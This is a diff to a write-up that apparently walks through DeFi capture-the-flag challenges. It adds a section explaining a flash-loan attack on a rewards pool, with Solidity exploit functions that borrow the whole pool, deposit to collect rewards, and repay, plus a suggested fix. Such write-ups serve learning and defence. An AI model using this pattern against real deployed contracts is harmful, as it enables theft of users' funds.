@@ -115,10 +115,31 @@ function attack(uint256 amount) external {
 }
 ```
 
-One solution is to instead of doing a balance check at the end, have the loaner contract transfer the amount from the borrower to the loaner itself. This would require the borrower to approve the amount first. This is how AAVE flash loans work. 
-
+One solution is to instead of doing a balance check at the end, have the loaner contract transfer the amount from the borrower to the loaner itself. This would require the borrower to approve the amount first (which is how AAVE flash loans work). 
 
 ### The rewarder
+The objective here is to steal all the rewards a pool contract is issuing to it users. 
+
+For our exploit we wait for a rewards round to start and then take out a flash loan equal to the size of the whole pool. Then we deposit it into the reward pool, which triggers a reward distribution. Since our borrower holds all of the tokens it gets nearly all the rewards. 
+
+Once the rewards are distributed we can withdraw our borrowed tokens and return them. 
+
+```solidity
+function receiveFlashLoan(uint256 amount) external {
+  token.approve(address(rewardPool), amount);
+  rewardPool.deposit(amount);
+  rewardPool.withdraw(amount);
+  token.transfer(loaner, amount);
+}
+
+function attack(uint256 amount) external {
+  ILoaner(loaner).flashLoan(amount);
+  uint256 rewards = rewardToken.balanceOf(address(this));
+  rewardToken.transfer(owner, rewards);
+}
+```
+A simple fix here would be to take the snapshot after distributing rewards instead of before. 
+
 ### Selfie
 ### Compromised
 ### Puppet
